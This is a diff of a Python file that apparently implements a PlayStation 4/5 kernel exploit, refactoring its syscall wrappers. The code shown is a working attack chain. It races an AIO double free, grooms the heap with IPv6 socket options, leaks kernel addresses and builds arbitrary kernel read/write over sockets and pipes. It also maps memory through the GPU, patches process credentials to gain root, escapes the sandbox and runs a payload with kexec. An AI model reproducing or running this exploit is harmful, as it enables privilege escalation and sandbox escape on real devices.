@@ -1,6 +1,17 @@
 import struct
 
 # if WRITING:  # dummy objects for writing code
+#     class Executable:
+#         errno = 0
+#         def __call__(self, *args, **kwargs):
+#             return 0
+
+#         def get_error_string(self):
+#             return ""
+
+#     class Container:
+#         def __getattribute__(self, name):
+#             return Executable()
 
 #     class sc:
 #         mem = bytearray()
@@ -11,13 +22,12 @@ import struct
 #         libc_addr = 0
 #         exec_addr = 0
 
-#         @staticmethod
-#         def run_function(*args, **kwargs):
-#             return 0
+#         syscalls = Container()
+#         functions = Container()
 
 #         @staticmethod
-#         def get_error_string():
-#             return ""
+#         def make_function_if_needed(name, addr):
+#             return Executable()
 
 #     class ROPChain:
 #         def __init__(self, *args, **kwargs):
@@ -1199,9 +1209,7 @@ def pin_to_core(core):
     setsize = 0x10
     mask = alloc(0x10)
     mask[0:2] = struct.pack("<H", 1 << core)
-    return sc.run_function(
-        SYSCALL["cpuset_setaffinity"], level, which, id, setsize, mask, syscall=True
-    )
+    return sc.syscalls.cpuset_setaffinity(level, which, id, setsize, mask)
 
 
 def get_core_index(mask_addr):
@@ -1220,9 +1228,7 @@ def get_current_core():
     id = 0xFFFFFFFFFFFFFFFF  # -1
     setsize = 0x10
     mask = alloc(0x10)
-    sc.run_function(
-        SYSCALL["cpuset_getaffinity"], level, which, id, setsize, mask, syscall=True
-    )
+    sc.syscalls.cpuset_getaffinity(level, which, id, setsize, mask)
     return get_core_index(get_ref_addr(mask))
 
 
@@ -1231,7 +1237,7 @@ def rtprio(type_, prio=0):
     rtprio_buf = alloc(4)
     rtprio_buf[0:2] = struct.pack("<H", PRI_REALTIME)
     rtprio_buf[2:4] = struct.pack("<H", prio)
-    sc.run_function(SYSCALL["rtprio_thread"], type_, 0, rtprio_buf, syscall=True)
+    sc.syscalls.rtprio_thread(type_, 0, rtprio_buf)
     if type_ == RTP_LOOKUP:
         return struct.unpack("<H", rtprio_buf[2:4])[0]
 
@@ -1281,7 +1287,7 @@ class PrimThread(object):
 
     def init(self):
         jmp_buf = alloc(0x60)
-        self.sc.run_function(self.sc.libc_addr + SELECTED_LIBC["setjmp"], jmp_buf)
+        self.sc.functions.setjmp(jmp_buf)
 
         self.fpu_ctrl_value = struct.unpack("<I", jmp_buf[0x40:0x44])[0]
         self.mxcsr_value = struct.unpack("<I", jmp_buf[0x44:0x48])[0]
@@ -1326,11 +1332,9 @@ class PrimThread(object):
 
         if (
             u32_to_i32(
-                self.sc.run_function(
-                    SYSCALL["thr_new"],
+                self.sc.syscalls.thr_new(
                     get_ref_addr(self.thr_new_args),
                     0x68,
-                    syscall=True,
                 )
             )
             == -1
@@ -1357,14 +1361,14 @@ int aio_submit_cmd(
 
 
 def aio_submit_cmd(cmd, reqs, num_reqs, ids):
-    ret = u32_to_i32(
-        sc.run_function(
-            SYSCALL["aio_submit_cmd"], cmd, reqs, num_reqs, 3, ids, syscall=True  # prio
-        )
-    )
+    ret = u32_to_i32(sc.syscalls.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids))  # prio
     if ret == -1:
         raise Exception(
-            "aio_submit_cmd error: %d\n%s" % (sc.errno, sc.get_error_string())
+            "aio_submit_cmd error: %d\n%s"
+            % (
+                sc.syscalls.aio_submit_cmd.errno,
+                sc.syscalls.aio_submit_cmd.get_error_string(),
+            )
         )
     return ret
 
@@ -1379,12 +1383,14 @@ int aio_multi_delete(
 
 
 def aio_multi_delete(ids, num_ids, states=AIO_ERRORS):
-    ret = u32_to_i32(
-        sc.run_function(SYSCALL["aio_multi_delete"], ids, num_ids, states, syscall=True)
-    )
+    ret = u32_to_i32(sc.syscalls.aio_multi_delete(ids, num_ids, states))
     if ret == -1:
         raise Exception(
-            "aio_multi_delete error: %d\n%s" % (sc.errno, sc.get_error_string())
+            "aio_multi_delete error: %d\n%s"
+            % (
+                sc.syscalls.aio_multi_delete.errno,
+                sc.syscalls.aio_multi_delete.get_error_string(),
+            )
         )
     return ret
 
@@ -1399,12 +1405,14 @@ int aio_multi_poll(
 
 
 def aio_multi_poll(ids, num_ids, states=AIO_ERRORS):
-    ret = u32_to_i32(
-        sc.run_function(SYSCALL["aio_multi_poll"], ids, num_ids, states, syscall=True)
-    )
+    ret = u32_to_i32(sc.syscalls.aio_multi_poll(ids, num_ids, states))
     if ret == -1:
         raise Exception(
-            "aio_multi_poll error: %d\n%s" % (sc.errno, sc.get_error_string())
+            "aio_multi_poll error: %d\n%s"
+            % (
+                sc.syscalls.aio_multi_poll.errno,
+                sc.syscalls.aio_multi_poll.get_error_string(),
+            )
         )
     return ret
 
@@ -1419,12 +1427,14 @@ int aio_multi_cancel(
 
 
 def aio_multi_cancel(ids, num_ids, states=AIO_ERRORS):
-    ret = u32_to_i32(
-        sc.run_function(SYSCALL["aio_multi_cancel"], ids, num_ids, states, syscall=True)
-    )
+    ret = u32_to_i32(sc.syscalls.aio_multi_cancel(ids, num_ids, states))
     if ret == -1:
         raise Exception(
-            "aio_multi_cancel error: %d\n%s" % (sc.errno, sc.get_error_string())
+            "aio_multi_cancel error: %d\n%s"
+            % (
+                sc.syscalls.aio_multi_cancel.errno,
+                sc.syscalls.aio_multi_cancel.get_error_string(),
+            )
         )
     return ret
 
@@ -1442,64 +1452,54 @@ int aio_multi_wait(
 
 
 def aio_multi_wait(ids, num_ids, states=AIO_ERRORS, mode=1, timeout=0):
-    ret = u32_to_i32(
-        sc.run_function(
-            SYSCALL["aio_multi_wait"], ids, num_ids, states, mode, timeout, syscall=True
-        )
-    )
+    ret = u32_to_i32(sc.syscalls.aio_multi_wait(ids, num_ids, states, mode, timeout))
     if ret == -1:
         raise Exception(
-            "aio_multi_wait error: %d\n%s" % (sc.errno, sc.get_error_string())
+            "aio_multi_wait error: %d\n%s"
+            % (
+                sc.syscalls.aio_multi_wait.errno,
+                sc.syscalls.aio_multi_wait.get_error_string(),
+            )
         )
     return ret
 
 
 def new_socket():
-    sd = u32_to_i32(
-        sc.run_function(
-            SYSCALL["socket"], AF_INET6, SOCK_DGRAM, IPPROTO_UDP, syscall=True
-        )
-    )
+    sd = u32_to_i32(sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
     if sd == -1:
-        raise Exception("new_socket error: %d\n%s" % (sc.errno, sc.get_error_string()))
+        raise Exception(
+            "new_socket error: %d\n%s"
+            % (sc.syscalls.socket.errno, sc.syscalls.socket.get_error_string())
+        )
     return sd
 
 
 def new_tcp_socket():
-    sd = u32_to_i32(
-        sc.run_function(SYSCALL["socket"], AF_INET, SOCK_STREAM, 0, syscall=True)
-    )
+    sd = u32_to_i32(sc.syscalls.socket(AF_INET, SOCK_STREAM, 0))
     if sd == -1:
         raise Exception(
-            "new_tcp_socket error: %d\n%s" % (sc.errno, sc.get_error_string())
+            "new_tcp_socket error: %d\n%s"
+            % (sc.syscalls.socket.errno, sc.syscalls.socket.get_error_string())
         )
     return sd
 
 
 def ssockopt(sd, level, optname, optval, optlen):
-    if (
-        u32_to_i32(
-            sc.run_function(
-                SYSCALL["setsockopt"], sd, level, optname, optval, optlen, syscall=True
-            )
+    if u32_to_i32(sc.syscalls.setsockopt(sd, level, optname, optval, optlen)) == -1:
+        raise Exception(
+            "ssockopt error: %d\n%s"
+            % (sc.syscalls.setsockopt.errno, sc.syscalls.setsockopt.get_error_string())
         )
-        == -1
-    ):
-        raise Exception("ssockopt error: %d\n%s" % (sc.errno, sc.get_error_string()))
 
 
 def gsockopt(sd, level, optname, optval, optlen):
     size = alloc(8)
     size[0:4] = struct.pack("<I", optlen)
-    if (
-        u32_to_i32(
-            sc.run_function(
-                SYSCALL["getsockopt"], sd, level, optname, optval, size, syscall=True
-            )
+    if u32_to_i32(sc.syscalls.getsockopt(sd, level, optname, optval, size)) == -1:
+        raise Exception(
+            "gsockopt error: %d\n%s"
+            % (sc.syscalls.getsockopt.errno, sc.syscalls.getsockopt.get_error_string())
         )
-        == -1
-    ):
-        raise Exception("gsockopt error: %d\n%s" % (sc.errno, sc.get_error_string()))
     return struct.unpack("<I", size[0:4])[0]
 
 
@@ -1673,15 +1673,16 @@ def create_pipe():
     fildes = alloc(0x10)
     if (
         u32_to_i32(
-            sc.run_function(
-                SYSCALL["pipe"],
+            sc.syscalls.pipe(
                 fildes,
-                syscall=True,
             )
         )
         == -1
     ):
-        raise Exception("create_pipe error: %d\n%s" % (sc.errno, sc.get_error_string()))
+        raise Exception(
+            "create_pipe error: %d\n%s"
+            % (sc.syscalls.pipe.errno, sc.syscalls.pipe.get_error_string())
+        )
     pipe_read_fd = struct.unpack("<I", fildes[0:4])[0]
     pipe_write_fd = struct.unpack("<I", fildes[4:8])[0]
     return pipe_read_fd, pipe_write_fd
@@ -1772,17 +1773,15 @@ def race_one(request_addr, tcp_sd, sds):
     wait_for(get_ref_addr(ready_signal), 1)
 
     # notify worker thread to resume
-    sc.run_function(SYSCALL["write"], pipe_write_fd, pipe_buf, 1, syscall=True)
+    sc.syscalls.write(pipe_write_fd, pipe_buf, 1)
 
     # yield and hope the scheduler runs the worker next.
     # the worker will then sleep at soclose() and hopefully we run next
-    sc.run_function(SYSCALL["sched_yield"], syscall=True)
+    sc.syscalls.sched_yield()
 
     # if we get here and the worker hasn't been reran then we can delay the
     # worker's execution of soclose() indefinitely
-    suspend_res = sc.run_function(
-        SYSCALL["thr_suspend_ucontext"], thr_tid, syscall=True
-    )
+    suspend_res = sc.syscalls.thr_suspend_ucontext(thr_tid)
 
     print("suspend %s: %d" % (hex(thr_tid), suspend_res))
 
@@ -1810,7 +1809,7 @@ def race_one(request_addr, tcp_sd, sds):
         won_race = True
 
     # resume the worker thread
-    result = sc.run_function(SYSCALL["thr_resume_ucontext"], thr_tid, syscall=True)
+    result = sc.syscalls.thr_resume_ucontext(thr_tid)
     print("resume %s: %d" % (hex(thr_tid), result))
 
     wait_for(get_ref_addr(deletion_signal), 1)
@@ -1861,15 +1860,16 @@ def double_free_reqs2(sds):
 
     ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, get_ref_addr(enable), 4)
 
-    if (
-        u32_to_i32(
-            sc.run_function(SYSCALL["bind"], sd_listen, server_addr, 16, syscall=True)
+    if u32_to_i32(sc.syscalls.bind(sd_listen, server_addr, 16)) == -1:
+        raise Exception(
+            "bind error: %d\n%s"
+            % (sc.syscalls.bind.errno, sc.syscalls.bind.get_error_string())
         )
-        == -1
-    ):
-        raise Exception("bind error: %d\n%s" % (sc.errno, sc.get_error_string()))
-    if u32_to_i32(sc.run_function(SYSCALL["listen"], sd_listen, 1, syscall=True)) == -1:
-        raise Exception("listen error: %d\n%s" % (sc.errno, sc.get_error_string()))
+    if u32_to_i32(sc.syscalls.listen(sd_listen, 1)) == -1:
+        raise Exception(
+            "listen error: %d\n%s"
+            % (sc.syscalls.listen.errno, sc.syscalls.listen.get_error_string())
+        )
 
     # 2. start the race
     num_reqs = 3
@@ -1883,17 +1883,13 @@ def double_free_reqs2(sds):
         sd_client = new_tcp_socket()
         print("sd_client: %d" % sd_client)
 
-        if (
-            u32_to_i32(
-                sc.run_function(
-                    SYSCALL["connect"], sd_client, server_addr, 16, syscall=True
-                )
+        if u32_to_i32(sc.syscalls.connect(sd_client, server_addr, 16)) == -1:
+            raise Exception(
+                "connect error: %d\n%s"
+                % (sc.syscalls.connect.errno, sc.syscalls.connect.get_error_string())
             )
-            == -1
-        ):
-            raise Exception("connect error: %d\n%s" % (sc.errno, sc.get_error_string()))
 
-        sd_conn = sc.run_function(SYSCALL["accept"], sd_listen, 0, 0, syscall=True)
+        sd_conn = sc.syscalls.accept(sd_listen, 0, 0)
         print("sd_conn: %d" % sd_conn)
 
         linger_buf = alloc(8)
@@ -1914,42 +1910,52 @@ def double_free_reqs2(sds):
         aio_multi_poll(get_ref_addr(aio_ids), num_reqs)
 
         # drop the reference so that aio_multi_delete() will trigger _fdrop()
-        sc.run_function(SYSCALL["close"], sd_client, syscall=True)
+        sc.syscalls.close(sd_client)
 
         res = race_one(req_addr, sd_conn, sds)
 
         # MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
         # twice. this will leave one request undeleted
         aio_multi_delete(get_ref_addr(aio_ids), num_reqs)
-        sc.run_function(SYSCALL["close"], sd_conn, syscall=True)
+        sc.syscalls.close(sd_conn)
 
         if res is not None:
             print("won race at attempt: %d" % (i + 1))
-            sc.run_function(SYSCALL["close"], sd_listen, syscall=True)
+            sc.syscalls.close(sd_listen)
             return res
 
     raise Exception("failed aio double free")
 
 
 def new_evf(name, flags):
-    ret = u32_to_i32(
-        sc.run_function(SYSCALL["evf_create"], name, 0, flags, syscall=True)
-    )
+    ret = u32_to_i32(sc.syscalls.evf_create(name, 0, flags))
     if ret == -1:
-        raise Exception("evf_create error: %d\n%s" % (sc.errno, sc.get_error_string()))
+        raise Exception(
+            "evf_create error: %d\n%s"
+            % (sc.syscalls.evf_create.errno, sc.syscalls.evf_create.get_error_string())
+        )
     return ret
 
 
 def set_evf_flags(id, flags):
-    if u32_to_i32(sc.run_function(SYSCALL["evf_clear"], id, 0, syscall=True)) == -1:
-        raise Exception("evf_clear error: %d\n%s" % (sc.errno, sc.get_error_string()))
-    if u32_to_i32(sc.run_function(SYSCALL["evf_set"], id, flags, syscall=True)) == -1:
-        raise Exception("evf_set error: %d\n%s" % (sc.errno, sc.get_error_string()))
+    if u32_to_i32(sc.syscalls.evf_clear(id, 0)) == -1:
+        raise Exception(
+            "evf_clear error: %d\n%s"
+            % (sc.syscalls.evf_clear.errno, sc.syscalls.evf_clear.get_error_string())
+        )
+    if u32_to_i32(sc.syscalls.evf_set(id, flags)) == -1:
+        raise Exception(
+            "evf_set error: %d\n%s"
+            % (sc.syscalls.evf_set.errno, sc.syscalls.evf_set.get_error_string())
+        )
 
 
 def free_evf(id):
-    if u32_to_i32(sc.run_function(SYSCALL["evf_delete"], id, syscall=True)) == -1:
-        raise Exception("evf_delete error: %d\n%s" % (sc.errno, sc.get_error_string()))
+    if u32_to_i32(sc.syscalls.evf_delete(id)) == -1:
+        raise Exception(
+            "evf_delete error: %d\n%s"
+            % (sc.syscalls.evf_delete.errno, sc.syscalls.evf_delete.get_error_string())
+        )
 
 
 def verity_reqs2(addr, cmd):
@@ -2015,7 +2021,7 @@ def leak_kernel_addrs(sd_pair, sds):
     name = alloc(1)
 
     # free one of rthdr
-    sc.run_function(SYSCALL["close"], sd_pair[1], syscall=True)
+    sc.syscalls.close(sd_pair[1])
 
     evf = None
     for i in range(NUM_ALIAS):
@@ -2310,7 +2316,7 @@ def double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_a
 
     print("start overwrite AIO queue entry with rthdr loop")
 
-    sc.run_function(SYSCALL["close"], sd, syscall=True)
+    sc.syscalls.close(sd)
     sd = None
 
     def overwrite_aio_entry_with_rthdr():
@@ -2461,11 +2467,12 @@ class IPv6KernelRW(object):
 
     def create_pipe_pair(self):
         pipe_fds = alloc(8)
-        res = u32_to_i32(
-            sc.run_function(SYSCALL["pipe"], get_ref_addr(pipe_fds), syscall=True)
-        )
+        res = u32_to_i32(sc.syscalls.pipe(get_ref_addr(pipe_fds)))
         if res == -1:
-            raise Exception("pipe error: %d\n%s" % (sc.errno, sc.get_error_string()))
+            raise Exception(
+                "pipe error: %d\n%s"
+                % (sc.syscalls.pipe.errno, sc.syscalls.pipe.get_error_string())
+            )
 
         read_fd = struct.unpack("<I", pipe_fds[0:4])[0]
         write_fd = struct.unpack("<I", pipe_fds[4:8])[0]
@@ -2484,30 +2491,22 @@ class IPv6KernelRW(object):
 
         pktinfo_size_store[0:8] = struct.pack("<Q", 0x14)
 
-        master_sock = sc.run_function(
-            SYSCALL["socket"], AF_INET6, SOCK_DGRAM, IPPROTO_UDP, syscall=True
-        )
-        victim_sock = sc.run_function(
-            SYSCALL["socket"], AF_INET6, SOCK_DGRAM, IPPROTO_UDP, syscall=True
-        )
+        master_sock = sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
+        victim_sock = sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
 
-        sc.run_function(
-            SYSCALL["setsockopt"],
+        sc.syscalls.setsockopt(
             master_sock,
             IPPROTO_IPV6,
             IPV6_PKTINFO,
             master_target_buf,
             0x14,
-            syscall=True,
         )
-        sc.run_function(
-            SYSCALL["setsockopt"],
+        sc.syscalls.setsockopt(
             victim_sock,
             IPPROTO_IPV6,
             IPV6_PKTINFO,
             slave_buf,
             0x14,
-            syscall=True,
         )
 
         master_so = self.get_fd_data_addr(master_sock)
@@ -2535,38 +2534,32 @@ class IPv6KernelRW(object):
         self.master_target_buf[0:8] = struct.pack("<Q", kaddr)
         self.master_target_buf[8:0x10] = struct.pack("<Q", 0)
         self.master_target_buf[0x10:0x14] = struct.pack("<I", 0)
-        sc.run_function(
-            SYSCALL["setsockopt"],
+        sc.syscalls.setsockopt(
             self.master_sock,
             IPPROTO_IPV6,
             IPV6_PKTINFO,
             get_ref_addr(self.master_target_buf),
             0x14,
-            syscall=True,
         )
 
     def ipv6_kread(self, kaddr, buffer_addr):
         self.ipv6_write_to_victim(kaddr)
-        sc.run_function(
-            SYSCALL["getsockopt"],
+        sc.syscalls.getsockopt(
             self.victim_sock,
             IPPROTO_IPV6,
             IPV6_PKTINFO,
             buffer_addr,
             self.pktinfo_size_store,
-            syscall=True,
         )
 
     def ipv6_kwrite(self, kaddr, buffer_addr):
         self.ipv6_write_to_victim(kaddr)
-        sc.run_function(
-            SYSCALL["setsockopt"],
+        sc.syscalls.setsockopt(
             self.victim_sock,
             IPPROTO_IPV6,
             IPV6_PKTINFO,
             buffer_addr,
             0x14,
-            syscall=True,
         )
 
     def ipv6_kread8(self, kaddr):
@@ -2586,7 +2579,7 @@ class IPv6KernelRW(object):
         self.pipemap_buffer[16:20] = struct.pack("<I", 0)
         self.ipv6_kwrite(self.pipe_addr + 0x10, get_ref_addr(self.pipemap_buffer))
 
-        sc.run_function(SYSCALL["read"], self.pipe_read_fd, uaddr, len, syscall=True)
+        sc.syscalls.read(self.pipe_read_fd, uaddr, len)
 
     def copyin(self, uaddr, kaddr, len):
         assert kaddr and uaddr and len
@@ -2601,7 +2594,7 @@ class IPv6KernelRW(object):
         self.pipemap_buffer[16:20] = struct.pack("<I", 0)
         self.ipv6_kwrite(self.pipe_addr + 0x10, get_ref_addr(self.pipemap_buffer))
 
-        sc.run_function(SYSCALL["write"], self.pipe_write_fd, uaddr, len, syscall=True)
+        sc.syscalls.write(self.pipe_write_fd, uaddr, len)
 
     def read_buffer(self, kaddr, len):
         mem = self.read_mem
@@ -2750,19 +2743,11 @@ def dangerous_dlsym(mod, symbol):
     out_buf = alloc(8)
     symbol = symbol + b"\0"
 
-    if (
-        u32_to_i32(
-            sc.run_function(
-                SYSCALL["dlsym"],
-                mod,
-                symbol,
-                out_buf,
-                syscall=True,
-            )
+    if u32_to_i32(sc.syscalls.dlsym(mod, symbol, out_buf)) == -1:
+        raise Exception(
+            "dlsym error: %d\n%s"
+            % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
         )
-        == -1
-    ):
-        raise Exception("dlsym error: %d\n%s" % (sc.errno, sc.get_error_string()))
 
     return struct.unpack("<Q", out_buf[0:8])[0]
 
@@ -2778,7 +2763,9 @@ def find_mod_by_name(name):
     mem = alloc(4 * 0x300)
     actual_num = alloc(8)
 
-    sc.run_function(sceKernelGetModuleListInternal, mem, 0x300, actual_num)
+    sc.make_function_if_needed(
+        "sceKernelGetModuleListInternal", sceKernelGetModuleListInternal
+    )(mem, 0x300, actual_num)
 
     num = struct.unpack("<Q", actual_num[0:8])[0]
     for i in range(num):
@@ -2786,7 +2773,9 @@ def find_mod_by_name(name):
         info = alloc(0x160)
         info[0:8] = struct.pack("<Q", 0x160)
 
-        sc.run_function(sceKernelGetModuleInfo, handle, info)
+        sc.make_function_if_needed("sceKernelGetModuleInfo", sceKernelGetModuleInfo)(
+            handle, info
+        )
 
         mod_name = get_cstring(info, 8)
         if mod_name == name:
@@ -2803,16 +2792,21 @@ class GPU(object):
         libSceGnmDriver, _ = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")
 
         # put these into global to make life easier
-        self.sceKernelAllocateMainDirectMemory = dangerous_dlsym(
-            sc.libkernel_addr, "sceKernelAllocateMainDirectMemory"
+        self.sceKernelAllocateMainDirectMemory = sc.make_function_if_needed(
+            "sceKernelAllocateMainDirectMemory",
+            dangerous_dlsym(sc.libkernel_addr, "sceKernelAllocateMainDirectMemory"),
         )
-        self.sceKernelMapDirectMemory = dangerous_dlsym(
-            sc.libkernel_addr, "sceKernelMapDirectMemory"
+        self.sceKernelMapDirectMemory = sc.make_function_if_needed(
+            "sceKernelMapDirectMemory",
+            dangerous_dlsym(sc.libkernel_addr, "sceKernelMapDirectMemory"),
         )
-        self.sceGnmSubmitCommandBuffers = dangerous_dlsym(
-            libSceGnmDriver, "sceGnmSubmitCommandBuffers"
+        self.sceGnmSubmitCommandBuffers = sc.make_function_if_needed(
+            "sceGnmSubmitCommandBuffers",
+            dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitCommandBuffers"),
         )
-        self.sceGnmSubmitDone = dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitDone")
+        self.sceGnmSubmitDone = sc.make_function_if_needed(
+            "sceGnmSubmitDone", dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitDone")
+        )
 
         prot_ro = PROT_READ | PROT_WRITE | GPU_READ
         prot_rw = prot_ro | GPU_WRITE
@@ -2829,14 +2823,10 @@ class GPU(object):
         if victim_ptbe_va is None or page_size != self.dmem_size:
             raise Exception("failed to setup gpu primitives")
 
-        if (
-            u32_to_i32(
-                sc.run_function(SYSCALL["mprotect"], victim_va, self.dmem_size, prot_ro)
-            )
-            == -1
-        ):
+        if u32_to_i32(sc.syscalls.mprotect(victim_va, self.dmem_size, prot_ro)) == -1:
             raise Exception(
-                "mprotect failed: %d\n%s" % (sc.errno, sc.get_error_string())
+                "mprotect failed: %d\n%s"
+                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
             )
 
         initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va)
@@ -2905,8 +2895,7 @@ class GPU(object):
 
         # submit to gpu
 
-        ret = sc.run_function(
-            self.sceGnmSubmitCommandBuffers,
+        ret = self.sceGnmSubmitCommandBuffers(
             dcb_count,
             dcb_gpu_addr,
             dcb_sizes_in_bytes,
@@ -2917,7 +2906,7 @@ class GPU(object):
             raise Exception("sceGnmSubmitCommandBuffers error: %s" % hex(ret))
 
         # inform gpu that current submission is done
-        ret = sc.run_function(self.sceGnmSubmitDone, 0)
+        ret = self.sceGnmSubmitDone(0)
         if ret != 0:
             raise Exception("sceGnmSubmitDone error: %s" % hex(ret))
 
@@ -2937,8 +2926,7 @@ class GPU(object):
 
         if (
             u32_to_i32(
-                sc.run_function(
-                    SYSCALL["mprotect"],
+                sc.syscalls.mprotect(
                     self.victim_va,
                     self.dmem_size,
                     prot_ro,
@@ -2947,7 +2935,8 @@ class GPU(object):
             == -1
         ):
             raise Exception(
-                "mprotect failed: %d\n%s" % (sc.errno, sc.get_error_string())
+                "mprotect failed: %d\n%s"
+                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
             )
 
         new_ptb = self.cleared_victim_ptbe_for_ro | trunc_phys_addr
@@ -2955,8 +2944,7 @@ class GPU(object):
 
         if (
             u32_to_i32(
-                sc.run_function(
-                    SYSCALL["mprotect"],
+                sc.syscalls.mprotect(
                     self.victim_va,
                     self.dmem_size,
                     prot_rw,
@@ -2965,7 +2953,8 @@ class GPU(object):
             == -1
         ):
             raise Exception(
-                "mprotect failed: %d\n%s" % (sc.errno, sc.get_error_string())
+                "mprotect failed: %d\n%s"
+                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
             )
 
         if is_write:
@@ -3094,9 +3083,7 @@ class GPU(object):
         out = alloc(8)
         mem_type = 1
 
-        ret = sc.run_function(
-            self.sceKernelAllocateMainDirectMemory, size, mem_type, out
-        )
+        ret = self.sceKernelAllocateMainDirectMemory(size, mem_type, out)
         if ret != 0:
             raise Exception("sceKernelAllocateMainDirectMemory error: %d" % (ret))
 
@@ -3104,9 +3091,7 @@ class GPU(object):
 
         out[0:8] = "\0" * 8
 
-        ret = sc.run_function(
-            self.sceKernelMapDirectMemory, out, size, prot, flag, phys_addr, size
-        )
+        ret = self.sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)
         if ret != 0:
             raise Exception("sceKernelMapDirectMemory error: %d" % (ret))
 
@@ -3274,7 +3259,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
     print("overwrite main pktopts")
     reclaim_sock = None
 
-    sc.run_function(SYSCALL["close"], pktopts_sds[1], syscall=True)
+    sc.syscalls.close(pktopts_sds[1])
 
     for i in range(NUM_ALIAS):
         for j in range(len(sds_alt)):
@@ -3349,7 +3334,7 @@ def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_
         raise Exception("invalid curproc kernel address: %s" % hex(curproc))
 
     possible_pid = slow_kread8(curproc + SELECTED_KERNEL_OFFSETS["PROC_PID"])
-    current_pid = sc.run_function(SYSCALL["getpid"], syscall=True)
+    current_pid = sc.syscalls.getpid()
 
     # TODO: check if this is the right implementation
     if possible_pid != current_pid:
@@ -3574,25 +3559,21 @@ def post_exploitation_ps4():
         aligned_memsz = 0x10000
 
         # create shm with exec permission
-        exec_handle = sc.run_function(
-            SYSCALL["jitshm_create"], 0, aligned_memsz, PROT_RWX, syscall=True
-        )
+        exec_handle = sc.syscalls.jitshm_create(0, aligned_memsz, PROT_RWX)
 
         # map executable segment
-        sc.run_function(
-            SYSCALL["mmap"],
+        sc.syscalls.mmap(
             mapping_addr,
             aligned_memsz,
             PROT_RWX,
             0x11,
             exec_handle,
             0,
-            syscall=True,
         )
         sc.mem[mapping_addr - 0x1000 : mapping_addr - 0x1000 + len(bin_data)] = bin_data
         print("First bytes: 0x%x", readuint(mapping_addr, 4))
 
-        sc.run_function(SYSCALL["kexec"], mapping_addr, syscall=True)
+        sc.syscalls.kexec(mapping_addr)
 
         print("After kexec")
 
@@ -3713,8 +3694,8 @@ def post_exploitation_ps5():
         ucred = kernel.read_qword(proc + OFFSET_P_UCRED)  # p_ucred
         authid = SYSTEM_AUTHID
 
-        uid_before = sc.run_function(SYSCALL["getuid"], syscall=True)
-        in_sandbox_before = sc.run_function(SYSCALL["is_in_sandbox"], syscall=True)
+        uid_before = sc.syscalls.getuid()
+        in_sandbox_before = sc.syscalls.is_in_sandbox()
 
         print("patching curproc %s (authid = %s)", hex(proc), hex(authid))
 
@@ -3722,8 +3703,8 @@ def post_exploitation_ps5():
         patch_dynlib_restriction(proc)
         escape_filesystem_sandbox(proc)
 
-        uid_after = sc.run_function(SYSCALL["getuid"], syscall=True)
-        in_sandbox_after = sc.run_function(SYSCALL["is_in_sandbox"], syscall=True)
+        uid_after = sc.syscalls.getuid()
+        in_sandbox_after = sc.syscalls.is_in_sandbox()
 
         print("we root now? uid: before %d after %d" % (uid_before, uid_after))
         print(
@@ -3799,18 +3780,19 @@ def kexploit():
 
     if (
         u32_to_i32(
-            sc.run_function(
-                SYSCALL["socketpair"],
+            sc.syscalls.socketpair(
                 AF_UNIX,
                 SOCK_STREAM,
                 0,
                 get_ref_addr(sockpair),
-                syscall=True,
             )
         )
         == -1
     ):
-        raise Exception("socketpair error: %d\n%s" % (sc.errno, sc.get_error_string()))
+        raise Exception(
+            "socketpair error: %d\n%s"
+            % (sc.syscalls.socketpair.errno, sc.syscalls.socketpair.get_error_string())
+        )
 
     block_fd = struct.unpack("<I", sockpair[0:4])[0]
     unblock_fd = struct.unpack("<I", sockpair[4:8])[0]
@@ -3849,7 +3831,7 @@ def kexploit():
             reqs1_addr, target_id, evf, sd_pair[0], sds, sds_alt, fake_reqs3_addr
         )
 
-        sc.run_function(SYSCALL["close"], fake_reqs3_sd, syscall=True)
+        sc.syscalls.close(fake_reqs3_sd)
 
         print("[+] Get arbitrary kernel read/write")
         make_kernel_arw(
@@ -3867,8 +3849,8 @@ def kexploit():
     except Exception as e:
         print("[-] Exploit failed: %s" % str(e))
     finally:
-        sc.run_function(SYSCALL["close"], block_fd, syscall=True)
-        sc.run_function(SYSCALL["close"], unblock_fd, syscall=True)
+        sc.syscalls.close(block_fd)
+        sc.syscalls.close(unblock_fd)
 
         if groom_ids is not None:
             free_aios2(get_ref_addr(groom_ids), NUM_GROOMS)
@@ -3878,10 +3860,10 @@ def kexploit():
             aio_multi_delete(get_ref_addr(block_id), 1)
 
         for sd in sds:
-            sc.run_function(SYSCALL["close"], sd, syscall=True)
+            sc.syscalls.close(sd)
 
         for sd in sds_alt:
-            sc.run_function(SYSCALL["close"], sd, syscall=True)
+            sc.syscalls.close(sd)
 
         print("restoring to previous core/rtprio")
 
